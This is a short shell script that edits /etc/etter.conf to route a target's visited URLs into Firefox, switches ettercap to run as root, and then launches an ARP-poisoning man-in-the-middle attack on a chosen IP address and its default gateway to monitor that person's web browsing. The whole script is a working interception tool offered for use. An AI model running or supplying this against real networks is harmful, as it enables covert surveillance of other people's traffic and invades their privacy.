#!/bin/sh

ShowUsage() {
#	echo "Usage $0 [--help] <target 1> <target 2> [<interface>]"
	echo "Usage $0 [--help] <target> [<interface>]"
	echo "$0 will ensure ettercap is configured to interface"
	echo "with the firefox plug-in and start monitoring "
	echo "<target> communications."
	echo ""
	echo "Note: <target> should be specified as an IP address."
	echo "<interface> is the network adapter (e.g. eth0, ath0)"
	echo "to use.  If not specified, eth0 is used."
	echo ""
	echo "Note that if you get a lot of tabs in Firefox, you can try"
	echo "about:config and change browser.link.open_newwindow to 1"
	echo ""
}

if [ $# -eq 0 ]; then
	ShowUsage
	exit 1
fi

if [ $1 == "--help" ]; then
	ShowUsage
	exit 1
fi

TARGET1=$1
# TARGET2=$2
ARPINTERFACE="eth0"

if [ $# -gt 1 ]; then
	ARPINTERFACE=$2
fi

if [ ! -e /etc/etter.conf ]; then
	echo "Unable to find ettercap.  Please make sure it is installed."
fi

cat /etc/etter.conf | grep -E '^remote_browser = \"firefox' > /dev/null

if [ $? -gt 0 ]; then
	# correct conf to work with firefox
	if [ ! -e /etc/etter.conf.bak ]; then
		cp /etc/etter.conf /etc/etter.conf.bak
	fi

# Original: remote_browser = "mozilla -remote openurl(http://%host%url)"
# Should be: remote_browser = "firefox http://%host%url"

	cat /etc/etter.conf | sed 's|^remote_browser = \"mozilla -remote openurl(http:\/\/\%host\%url)\"|remote_browser = \"firefox http:\/\/\%host\%url\"|' | sed 's|id = 65534|id = 0|g' > /etc/etter.conf.tmp
	cp /etc/etter.conf.tmp /etc/etter.conf
	rm /etc/etter.conf.tmp
fi

# -M says MitM using ARP poisoning and remote gateway
# -Q says SuperQuiet mode (no messages)
echo "Poisoning $TARGET and the default gateway..."
# ettercap -T -Q -M arp:remote -i $ARPINTERFACE /$TARGET1/ /$TARGET2/ -P remote_browser
ettercap -T -Q -M arp:remote -i $ARPINTERFACE /$TARGET1/ // -P remote_browser

